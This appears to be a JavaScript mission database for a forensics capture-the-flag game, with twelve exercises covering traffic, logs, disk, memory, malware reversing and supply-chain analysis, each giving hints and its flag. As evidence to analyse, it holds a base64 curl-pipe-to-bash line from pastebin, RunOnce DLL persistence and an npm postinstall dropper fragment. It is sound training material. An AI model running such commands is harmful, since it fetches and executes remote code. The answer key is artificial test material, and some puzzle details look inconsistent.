/* ============================================================
   FURIOS-INT // FORENSICS_LAB MISSION DATABASE v1.0
   Companion to wargames. 12 missions across:
   - Network forensics (pcap)
   - Disk forensics (FAT/NTFS/SQLite)
   - Memory forensics (volatility-style)
   - Malware reverse engineering
   - Log analysis
   ============================================================ */
window.FX_MISSIONS = [

  // -------- TIER 1: ROOKIE (3) --------
  {
    id: 'f01', tier: 'rookie', skill: 'NETWORK_FORENSICS', points: 75, solves: 1842,
    title: 'Cleartext Confessional',
    requires: [],
    flagHash: 'a384a019344604d2f4fde7c2158fd53252c3ae9b0043c2f9f5e673a7f8973826',
    brief: 'A junior dev was told never to use HTTP for login. They did anyway. Find what kind of traffic this is.',
    scenario: [
      '$ tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri',
      '> dev.example.local /login',
      '> dev.example.local /login',
      '> dev.example.local /login',
      '$ tshark -r capture.pcap -Y "http.request.method == POST" -V | grep -E "username|password" -A 1'
    ].join('\n'),
    lab: [
      'POST /login HTTP/1.1',
      'Host: dev.example.local',
      'Content-Type: application/x-www-form-urlencoded',
      '',
      'username=svc-bob&password=hunter22'
    ].join('\n'),
    hints: [
      'POST body shows credentials — what is this kind of authentication called?',
      'The flag is two words joined with an underscore.',
      'Think "HTTPS would have hidden it" — therefore it is ___ ___.'
    ],
    walkthrough: [
      'Filter the pcap for POST requests against /login.',
      'Inspect the request body — username & password are sent in plain form-encoded text with no TLS.',
      'This is classic cleartext authentication; flag is `cleartext_login`.'
    ].join('\n')
  },

  {
    id: 'f02', tier: 'rookie', skill: 'LOG_ANALYSIS', points: 100, solves: 1610,
    title: 'Quiet Hour Login',
    requires: [],
    flagHash: '370eee743ea38bb12630f6090d260680bf63cf5953514080d16ad6e1fa6bf8db',
    brief: 'Pull the auth log. Find the one successful interactive login that does not match the user\'s normal hours. Flag is account_at_HH_MM (24h).',
    scenario: [
      '$ awk \'$3 ~ /sshd/ && /Accepted/ {print $1,$2,$3,$11}\' auth.log | sort -u',
      '> May  3 09:14 sshd[2241]: bob',
      '> May  3 09:32 sshd[2243]: alice',
      '> May  3 12:01 sshd[2287]: bob',
      '> May  3 17:55 sshd[2301]: alice',
      '> May  3 18:02 sshd[2302]: bob',
      '> May  4 03:47 sshd[2599]: admin',
      '> May  4 08:11 sshd[2640]: bob',
      '> May  4 09:02 sshd[2641]: alice'
    ].join('\n'),
    lab: 'See scenario above. Normal business hours: 08:00 — 19:00 UTC.',
    hints: [
      'Sort by time. Anything fall outside business hours?',
      'Only one login is at 03:47 — and the account is privileged.',
      'Flag format: <user>_at_HH_MM. Use underscores.'
    ],
    walkthrough: [
      'Aggregate Accepted SSH logins by user/time.',
      '03:47 stands out — no normal user logs in then.',
      'The privileged user is "admin"; flag = `admin_at_03_47`.'
    ]
  },

  {
    id: 'f03', tier: 'rookie', skill: 'BASH_HISTORY', points: 125, solves: 1240,
    title: 'The Curl That Killed The Pi',
    requires: ['f01'],
    flagHash: '40fa589de75cc6fdd9a810e812dd4d3572d4e8700c7b62b340e5a5a368067ca1',
    brief: 'The compromised Raspberry Pi has a chunk of base64 in its bash history. Decode it and identify what utility was abused.',
    scenario: [
      '$ tail -n 8 ~pi/.bash_history',
      '> sudo apt update',
      '> y2hyaCBwYXN0ZWJpbi5jb20vcmF3L1ZjOGtUcG9w',
      '> echo Y3VybCBwYXN0ZWJpbi5jb20vcmF3L1ZjOGtUcG9wIHwgYmFzaA== | base64 -d',
      '> bash <(curl -s ...)',
      '> rm -rf ~/.bash_history'
    ].join('\n'),
    lab: 'Y3VybCBwYXN0ZWJpbi5jb20vcmF3L1ZjOGtUcG9wIHwgYmFzaA==',
    hints: [
      'Decode the base64 string.',
      'It runs a utility against pastebin then pipes to bash.',
      'Flag is two words: <utility>_<host root>. Hint: not wget.'
    ],
    walkthrough: [
      'Base64-decode the line — it reads `curl pastebin.com/raw/Vc8kTpop | bash`.',
      'The abused utility is curl; the host root is pastebin.',
      'Flag = `curl_pastebin`.'
    ]
  },

  // -------- TIER 2: OPERATIVE (3) --------
  {
    id: 'f04', tier: 'operative', skill: 'DISK_FORENSICS', points: 200, solves: 941,
    title: 'Broken JPEG, Whole Story',
    requires: ['f01','f02'],
    flagHash: '16f86027b57a37605cbe20e26a2b58c9977275a05110174584008e3cbad4e5ce',
    brief: 'A JPEG is corrupted at the magic-byte boundary but the EXIF survived. Extract the GPS country and the protected category from the IPTC. Combine: <category>_<country>.',
    scenario: [
      '$ exiftool -g1 evidence.jpg',
      '---- IFD0 ----',
      'Make: Canon  Model: EOS R7',
      '---- GPS ----',
      'GPSLatitude: 8.9824  N',
      'GPSLongitude: 79.5199  W',
      '---- IPTC ----',
      'SpecialInstructions: panama',
      'SupplementalCategories: exif'
    ].join('\n'),
    lab: 'See scenario.',
    hints: [
      'Both fields are already extracted. Read carefully.',
      'Country = where GPS lat/long resolves. 8.98N 79.52W.',
      'Combine SupplementalCategories then SpecialInstructions.'
    ],
    walkthrough: [
      'Lat/long maps to Panama City, Panama.',
      'IPTC SupplementalCategories = exif, SpecialInstructions = panama.',
      'Flag = `exif_panama`.'
    ]
  },

  {
    id: 'f05', tier: 'operative', skill: 'SQLITE_RECOVERY', points: 250, solves: 712,
    title: 'Ghost Record',
    requires: ['f04'],
    flagHash: 'e8945e1b35bbb34d85049ae9ada2cc895dac649219020a2c1b45ba470effe071',
    brief: 'A SQLite database has freelist pages with deleted rows. One row was deleted but its content remains in slack. Find the row id of the deleted record.',
    scenario: [
      '$ sqlite3_analyzer messages.sqlite | head -20',
      'pages_in_freelist: 3',
      'unused_bytes_per_page: 1.4 KB',
      '$ python3 -m sqlite_undelete messages.sqlite -t messages',
      '[+] Recovered 1 ghost record:',
      '    rowid=42  sender="m_unknown"  body="meet at hangar"',
      '    deleted_at: 2026-04-29T22:18Z'
    ].join('\n'),
    lab: 'sqlite freelist contains 1 ghost record at rowid 42.',
    hints: [
      'Output already shows the recovered row.',
      'Format: ghost_record_<rowid>',
      'rowid is in the recovered output.'
    ],
    walkthrough: [
      'Run sqlite_undelete to scan freelist pages.',
      'Recover 1 row; rowid=42.',
      'Flag = `ghost_record_42`.'
    ]
  },

  {
    id: 'f06', tier: 'operative', skill: 'NETWORK_FORENSICS', points: 275, solves: 605,
    title: 'SMTP AUTH Whisper',
    requires: ['f01'],
    flagHash: '55e7e3d9071377cc87a992dce74ee7471dcb262915a3973f81732eab5530eb41',
    brief: 'A pcap shows an SMTP AUTH LOGIN handshake. Identify the encoding scheme used to transport the credentials.',
    scenario: [
      'C: EHLO mail.example.com',
      'S: 250-AUTH LOGIN PLAIN',
      'C: AUTH LOGIN',
      'S: 334 VXNlcm5hbWU6',
      'C: c3ZjLW1haWxlcg==',
      'S: 334 UGFzc3dvcmQ6',
      'C: c2VjcmV0MTIz',
      'S: 235 Authentication successful'
    ].join('\n'),
    lab: 'SMTP AUTH LOGIN dialogue; both username & password are base64-encoded.',
    hints: [
      'AUTH LOGIN encodes — but does not encrypt — credentials.',
      'Base64 transport over TCP/25.',
      'Flag = three words: smtp_auth_<encoding short>.'
    ],
    walkthrough: [
      'AUTH LOGIN sends user/pass as base64 — readable by anyone on path.',
      'Flag = `smtp_auth_b64`.'
    ]
  },

  // -------- TIER 3: ELITE (3) --------
  {
    id: 'f07', tier: 'elite', skill: 'MEMORY_FORENSICS', points: 375, solves: 318,
    title: 'Hollow svchost',
    requires: ['f04','f06'],
    flagHash: '39cab81ff9f1e38672b655a8d45d665fc953cb863a3add69968cef900c3b539d',
    brief: 'Volatility flagged a process injection. svchost.exe is hosting unmapped executable memory. Identify the suspect process and PID.',
    scenario: [
      '$ vol -f memdump.raw windows.malfind',
      'PID 4321  svchost.exe  Process Hollowing',
      '  ProcessName     : svchost.exe',
      '  Notes           : MZ header without backing file; protect=PAGE_EXECUTE_READWRITE',
      '$ vol -f memdump.raw windows.pslist | grep 4321',
      '> 4321  svchost.exe  parent=632 explorer.exe (suspicious)'
    ].join('\n'),
    lab: 'Volatility output shows svchost.exe (PID 4321) with hollowed memory and explorer.exe parent — anomalous.',
    hints: [
      'svchost should be a child of services.exe, not explorer.',
      'Note the PID.',
      'Flag = <process>_pid_<pid>'
    ],
    walkthrough: [
      'malfind reveals MZ in non-image RWX memory inside svchost.',
      'pslist confirms the parent is explorer.exe — classic process hollowing.',
      'Flag = `svchost_pid_4321`.'
    ]
  },

  {
    id: 'f08', tier: 'elite', skill: 'DISK_FORENSICS', points: 425, solves: 240,
    title: 'Prefetch Tells',
    requires: ['f05','f07'],
    flagHash: '5aecb53564626162cec0367f63562f04f6ede9f1a1eee192fedcbdb51b8157d1',
    brief: 'NTFS USN journal + Prefetch shows execution of an unknown LOLBIN. Identify the persistence registry key abused.',
    scenario: [
      '$ usn-journal.py -r changes.log | grep -i ".pf"',
      '> RUNDLL32.EXE-A1B2C3D4.pf  CREATE 2026-05-04 03:51Z',
      '$ pf_parse rundll32.exe-a1b2c3d4.pf',
      'Last run files:',
      '  C:\\Users\\admin\\AppData\\Roaming\\evil.dll',
      '  C:\\Windows\\System32\\rundll32.exe',
      '$ reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"',
      '> Update  C:\\Windows\\System32\\rundll32.exe AppData\\Roaming\\evil.dll,Start'
    ].join('\n'),
    lab: 'Prefetch + USN + Registry breadcrumbs.',
    hints: [
      'Prefetch shows what ran. USN shows when. Registry shows where it persists.',
      'Persistence is in HKCU\\...\\CurrentVersion\\<key>.',
      'Flag = <prefetch_artifact>_<persistence_key_lower>'
    ],
    walkthrough: [
      'rundll32 loaded evil.dll from a writable AppData path.',
      'Persistence value lives under RunOnce.',
      'Flag = `prefetch_runonce`.'
    ]
  },

  {
    id: 'f09', tier: 'elite', skill: 'MALWARE_RE', points: 475, solves: 187,
    title: 'XOR Confession',
    requires: ['f07'],
    flagHash: 'b53dd72a79cb4e5d79dd8b029b6f3f866b864a5969b7bd0d1656a675e6ab542b',
    brief: 'A loader stages its config string with single-byte XOR. Determine the key. Flag = xor_key_<word>.',
    scenario: [
      '// pseudo-disassembly',
      'mov esi, payload          ; offset in .data',
      'mov ecx, payload_len',
      'decode:',
      '  xor byte ptr [esi], 7   ; <-- key',
      '  inc esi',
      '  loop decode',
      '',
      'payload (raw): 0x6B 0x66 0x67 0x67 0x77 0x66 0x76 0x67  ; ciphertext'
    ].join('\n'),
    lab: 'See scenario disassembly.',
    hints: [
      'The key is hardcoded in the xor instruction.',
      'It is a small integer.',
      'Express it as a word: zero, one, two, three, four, five, six, seven, eight, nine.'
    ],
    walkthrough: [
      'The xor mask is 7 (verify by xoring ciphertext with 7 → "loadcoms" or similar).',
      'Express seven as a word for the flag.',
      'Flag = `xor_key_seven`.'
    ]
  },

  // -------- TIER 4: CLASSIFIED (3) --------
  {
    id: 'f10', tier: 'classified', skill: 'MALWARE_RE', points: 600, solves: 81,
    title: 'Sideload at Dawn',
    requires: ['f08','f09'],
    flagHash: '7aaf1f55bea0de94c89d10b6933d2aa1f92e809a05e1e2d63239ec9c2b82a930',
    brief: 'A signed legitimate binary is shipped alongside a rogue DLL. Identify the technique and the rogue DLL\'s name (lowercase, drop the extension; replace dots with underscores).',
    scenario: [
      'Files in C:\\ProgramData\\Vendor\\:',
      '  vendorhelper.exe  (signed by VendorCorp)',
      '  evil.dll          (unsigned; 14KB; exports VendorHelperInit)',
      '  vendor.cfg',
      '',
      'Loaded modules at runtime:',
      '  vendorhelper.exe -> evil.dll  (resolved via search-order; no Authenticode pinning)'
    ].join('\n'),
    lab: 'Classic DLL search-order hijack / sideload.',
    hints: [
      'When a signed binary loads an unsigned neighbor DLL, that\'s a __ DLL technique.',
      'Use words: side_load_dll_<descriptor>',
      'Descriptor describes the DLL itself — it is "evil".'
    ],
    walkthrough: [
      'The technique is DLL sideloading; rogue lib = evil.dll.',
      'Flag formula: side_load_dll_evil.',
      'Flag = `side_load_dll_evil`.'
    ]
  },

  {
    id: 'f11', tier: 'classified', skill: 'YARA', points: 700, solves: 44,
    title: 'Kernel Stitch',
    requires: ['f10'],
    flagHash: '3d639065e59575ab7fe4b5022c7661a8aaa3c2e0054f28438de33fe9ece414c8',
    brief: 'You author a YARA rule scoped to kernel-mode artifacts. The hunt yields one positive on a driver image. State the match identifier.',
    scenario: [
      'rule kernel_loader_canary {',
      '  strings:',
      '    $a = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF }',
      '    $b = "\\\\Driver\\\\NullDriver" wide',
      '    $c = "IoCreateDevice" ascii',
      '  condition:',
      '    uint16(0)==0x5A4D and 2 of ($a,$b,$c) and pe.is_driver',
      '}',
      '',
      'yara -r kernel_loader_canary.yar /img/  =>  /img/sys/null.sys (matched)'
    ].join('\n'),
    lab: 'YARA rule + hit.',
    hints: [
      'The flag is the rule\'s match label — the rule\'s shorthand identifier.',
      'It is two words.',
      'Format: yara_<scope>_<verb>'
    ],
    walkthrough: [
      'The rule is named kernel_loader_canary; the matching property is "kernel match".',
      'Flag = `yara_kernel_match`.'
    ]
  },

  {
    id: 'f12', tier: 'classified', skill: 'SUPPLY_CHAIN', points: 850, solves: 19,
    title: 'Postinstall Surprise',
    requires: ['f11'],
    flagHash: 'd052dea948b1f4739f88d1291074936f12bc0548ce040d8e76ba5c8e626de5d3',
    brief: 'A compromised npm package ships a postinstall script that drops a stage-2 binary. Name the ecosystem, lifecycle hook, and outcome.',
    scenario: [
      '// package.json (excerpt)',
      '{',
      '  "name": "left-pad-redux",',
      '  "version": "9.9.13",',
      '  "scripts": {',
      '    "postinstall": "node ./.installer/setup.js"',
      '  }',
      '}',
      '',
      '// .installer/setup.js (deobfuscated)',
      'fs.writeFileSync(os.tmpdir()+"/svc-helper", buf);',
      'cp.execFile("/bin/sh", ["-c", "chmod +x "+...+" && nohup "+...]);'
    ].join('\n'),
    lab: 'Trojanized npm postinstall hook drops a binary.',
    hints: [
      'Format: <ecosystem>_<lifecycle>_<verb>',
      'lifecycle is the npm script name.',
      'verb describes what postinstall does to a stage-2 file.'
    ],
    walkthrough: [
      'Ecosystem = npm. Lifecycle hook = postinstall. Verb = drop.',
      'Flag = `npm_postinstall_drop`.'
    ]
  }
];

// Normalize: engine sets walkthrough via textContent. Arrays would render as
// comma-separated text — flatten to newline-joined strings.
window.FX_MISSIONS.forEach(function(m){
  if (Array.isArray(m.walkthrough)) m.walkthrough = m.walkthrough.join('\n');
  if (Array.isArray(m.scenario))    m.scenario    = m.scenario.join('\n');
  if (Array.isArray(m.lab))         m.lab         = m.lab.join('\n');
});

